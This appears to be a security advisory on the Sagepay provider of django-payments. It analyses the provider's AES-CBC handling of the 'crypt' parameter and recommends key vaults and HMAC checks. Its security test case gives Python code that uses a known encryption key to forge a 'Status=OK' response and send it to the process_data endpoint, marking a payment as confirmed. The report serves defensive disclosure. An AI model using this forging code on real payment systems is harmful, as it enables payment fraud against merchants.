## Vulnerability List

- **Vulnerability Name:** Sagepay Encryption Key Exposure leading to Payment Data Manipulation

- **Description:**
    The Sagepay payment provider uses AES encryption to protect sensitive payment data transmitted between the application and Sagepay. However, the encryption key (`encryption_key`) is stored on the server-side and used for both encryption and decryption within the `SagepayProvider` class. If an attacker gains access to this encryption key, they can:
    1. Decrypt payment data sent to Sagepay, potentially exposing sensitive information like credit card details.
    2. Encrypt malicious data and send it to the application's `process_data` endpoint, potentially manipulating payment status or other parameters.

    **Step-by-step trigger:**
    1. **Gain Access to Encryption Key:** An attacker needs to find a way to access the `encryption_key` configured for the Sagepay provider. This could be achieved through various server-side vulnerabilities like:
        - Accessing configuration files where the key might be stored.
        - Exploiting code vulnerabilities (e.g., local file inclusion, remote code execution) to read the key from memory or environment variables.
        - Social engineering or insider threats.
    2. **Intercept Encrypted Payment Data (Optional):** To decrypt payment data, the attacker would need to intercept the encrypted `Crypt` parameter sent from the application to Sagepay. This could be done through network sniffing (if the connection is not HTTPS or if TLS is compromised) or by compromising the user's browser or machine.
    3. **Forge Malicious Crypt Parameter:** To manipulate payment status, the attacker can create a malicious `Crypt` parameter. They would need to:
        - Understand the data structure expected by Sagepay (key-value pairs separated by '&').
        - Modify parameters like `Status` in the encrypted data.
        - Encrypt the modified data using the stolen `encryption_key` and the `aes_enc` function from `SagepayProvider`.
    4. **Send Malicious Request:** The attacker sends a request to the application's Sagepay `process_data` endpoint with the forged `crypt` parameter in the GET request.
    5. **Payment Manipulation:** The application decrypts the `crypt` parameter using the compromised key and processes the data. If the attacker successfully manipulated the `Status` parameter to "OK", the payment status will be incorrectly updated to `CONFIRMED`.

- **Impact:**
    - **Confidentiality Breach:** Exposure of sensitive payment data, including credit card details, if the attacker decrypts intercepted `Crypt` parameters.
    - **Integrity Breach:** Manipulation of payment status, allowing attackers to mark payments as successful even if they failed or were never actually processed by Sagepay. This could lead to financial loss for the application owner and potential service disruption.

- **Vulnerability Rank:** High

- **Currently Implemented Mitigations:**
    - **HTTPS:** It's assumed that HTTPS is used for communication, which encrypts the network traffic and makes it harder to intercept the `Crypt` parameter in transit. However, HTTPS does not protect against key exposure on the server.
    - **Encryption:** Sagepay provider uses AES encryption, which is a strong encryption algorithm. However, the vulnerability lies in the server-side key management, not the algorithm itself.

- **Missing Mitigations:**
    - **Key Protection:** The most critical missing mitigation is proper protection of the `encryption_key`. It should not be stored in easily accessible configuration files or environment variables. Consider using:
        - **Hardware Security Modules (HSMs):** Store the key in a dedicated hardware device designed for key management.
        - **Key Vault Services:** Use cloud-based key management services provided by cloud providers (e.g., AWS KMS, Azure Key Vault, Google Cloud KMS).
        - **Encrypted Configuration:** Encrypt the configuration file where the key is stored, and decrypt it only when needed using secure mechanisms.
        - **Principle of Least Privilege:** Limit access to the server and configuration files to only necessary personnel.
    - **Input Validation and Integrity Checks:** While decryption is performed, the application should also implement integrity checks on the decrypted data to ensure it hasn't been tampered with. This could include:
        - **HMAC:** Using a Hash-based Message Authentication Code (HMAC) to sign the encrypted data. The signature would be verified after decryption to ensure data integrity.
        - **Strict Data Format Validation:** Enforce strict validation on the decrypted data format and values to prevent unexpected or malicious inputs from being processed.

- **Preconditions:**
    - **Vulnerable Sagepay Integration:** The application must be using the `payments.sagepay.SagepayProvider` with the server-side encryption key.
    - **Encryption Key Exposure:** The attacker must successfully gain access to the `encryption_key` configured for the Sagepay provider.

- **Source Code Analysis:**

    1. **Key Storage and Usage (`payments/sagepay/__init__.py`):**
    ```python
    class SagepayProvider(BasicProvider):
        def __init__(self, vendor, encryption_key, endpoint=_action, **kwargs):
            self._vendor = vendor
            self._enckey = encryption_key.encode("utf-8") # Encryption key is stored as attribute
            self._action = endpoint
            super().__init__(**kwargs)
    ```
    The `encryption_key` is passed as a parameter during provider initialization and stored as `self._enckey`. This key is then used in `aes_enc` and `aes_dec` methods for encryption and decryption.

    2. **Encryption Function (`payments/sagepay/__init__.py`):**
    ```python
    def aes_enc(self, data):
        data = data.encode("utf-8")
        padder = self._get_padding().padder()
        data = padder.update(data) + padder.finalize()
        encryptor = self._get_cipher().encryptor()
        enc = encryptor.update(data) + encryptor.finalize()
        return b"@" + binascii.hexlify(enc)
    ```
    This function encrypts the data using AES-CBC with the server-side key `self._enckey`.

    3. **Decryption Function (`payments/sagepay/__init__.py`):**
    ```python
    def aes_dec(self, data):
        data = data.lstrip(b"@")
        data = binascii.unhexlify(data)
        decryptor = self._get_cipher().decryptor()
        data = decryptor.update(data) + decryptor.finalize()
        return data.decode("utf-8")
    ```
    This function decrypts the data using AES-CBC with the same server-side key `self._enckey`.

    4. **Data Processing (`payments/sagepay/__init__.py`):**
    ```python
    def process_data(self, payment, request):
        udata = self.aes_dec(request.GET["crypt"]) # Decrypts 'crypt' parameter from GET request
        data = {}
        for kv in udata.split("&"):
            k, v = kv.split("=")
            data[k] = v
        # ... processes decrypted data ...
        if data["Status"] == "OK": # Relies on 'Status' from decrypted data
            payment.captured_amount = payment.total
            payment.change_status(PaymentStatus.CONFIRMED)
            return redirect(success_url)
        payment.change_status(PaymentStatus.REJECTED)
        return redirect(payment.get_failure_url())
    ```
    The `process_data` function retrieves the `crypt` parameter from the GET request, decrypts it using `aes_dec`, and then parses the decrypted data. Critically, it directly uses the `Status` parameter from the decrypted data to determine the payment status without additional integrity checks.

    **Visualization:**

    ```
    [Attacker] --> (Request to compromise server/config to get encryption_key)
           ^
           | Encryption Key Stolen
           |
    [Attacker] --> (Craft Malicious Data with Status=OK)
           |
           V Encrypt with stolen key using aes_enc
    [Attacker] --> (Send forged 'crypt' parameter to /payments/sagepay/process_data) --> [Application]
           |
           V Decrypt 'crypt' parameter using aes_dec and stolen key
    [Application] --> (Process data, reads Status=OK)
           |
           V Update payment status to CONFIRMED (incorrectly)
    ```

- **Security Test Case:**

    **Pre-requisites:**
    - Set up a test Django application using `django-payments` with Sagepay provider enabled.
    - Configure Sagepay provider with a known `encryption_key` (e.g., '1234abdd1234abcd' as used in tests).
    - Make the payment processing endpoint (`/payments/sagepay/process_data/`) publicly accessible for testing purposes.

    **Steps:**
    1. **Obtain Encryption Key:** For testing purposes, we assume we have access to the `encryption_key` which is '1234abdd1234abcd'. In a real attack, this step would involve exploiting server-side vulnerabilities.
    2. **Prepare Malicious Data:** Create a dictionary representing the data to be encrypted. Include the necessary parameters for Sagepay response, and importantly, set `"Status": "OK"` to simulate a successful payment.

       ```python
       import requests
       from payments.sagepay import SagepayProvider # Assuming payments is installed and in PYTHONPATH

       VENDOR = "abcd1234" # Replace with your test vendor if needed
       ENCRYPTION_KEY = "1234abdd1234abcd" # Known encryption key
       provider = SagepayProvider(vendor=VENDOR, encryption_key=ENCRYPTION_KEY)

       malicious_data_dict = {
           "Status": "OK", # Force status to OK
           "VendorTxCode": "test_order_123", # Replace with a valid VendorTxCode or payment ID
           "VPSTxId": "{25A4FFC3-C332-4639-8932-1234567890AB}", # Dummy VPSTxId
           "TxAuthNo": "1234", # Dummy TxAuthNo
           "Amount": "100.00", # Dummy Amount
           "AVSCV2": "ALL MATCH", # Dummy AVSCV2
           "SecurityKey": "sekurity", # Dummy SecurityKey
           "AddressResult": "NOTPROVIDED", # Dummy AddressResult
           "PostCodeResult": "NOTPROVIDED", # Dummy PostCodeResult
           "CVV2Result": "MATCHED", # Dummy CVV2Result
           "3DSecureStatus": "OK", # Dummy 3DSecureStatus
           "CAVV": "1234", # Dummy CAVV
           "CardType": "VISA", # Dummy CardType
           "Last4Digits": "1234", # Dummy Last4Digits
           "DeclineCode": "00", # Dummy DeclineCode
           "ExpiryDate": "12/24", # Dummy ExpiryDate
           "BankAuthCode": "999777", # Dummy BankAuthCode
       }

       malicious_data_string = "&".join("{}={}".format(k, v) for k, v in malicious_data_dict.items())
       ```

    3. **Encrypt Malicious Data:** Use the `aes_enc` function from `SagepayProvider` and the stolen `encryption_key` to encrypt the malicious data string.

       ```python
       encrypted_crypt = provider.aes_enc(malicious_data_string)
       ```

    4. **Construct Malicious URL:** Create the URL to the `process_data` endpoint, appending the encrypted `crypt` parameter to the GET request. Replace `http://your-test-app/payments/sagepay/process_data/` with the actual URL of your test application.

       ```python
       malicious_url = f"http://your-test-app/payments/sagepay/process_data/?crypt={encrypted_crypt.decode()}"
       ```

    5. **Send Malicious Request:** Send a GET request to the constructed `malicious_url`.

       ```python
       response = requests.get(malicious_url)
       print(response.status_code) # Expect 302 (redirect) or 200 (if process_data doesn't redirect directly)
       # Check the payment status in your application's database. It should be incorrectly marked as CONFIRMED.
       ```

    6. **Verify Payment Status:** Check the payment status in your application's database for the corresponding `VendorTxCode` (or payment ID). It should be incorrectly updated to `CONFIRMED`, even though no actual payment occurred.

This test case demonstrates that by gaining access to the encryption key, an attacker can forge a successful Sagepay response and manipulate the payment status within the application, leading to a critical integrity vulnerability.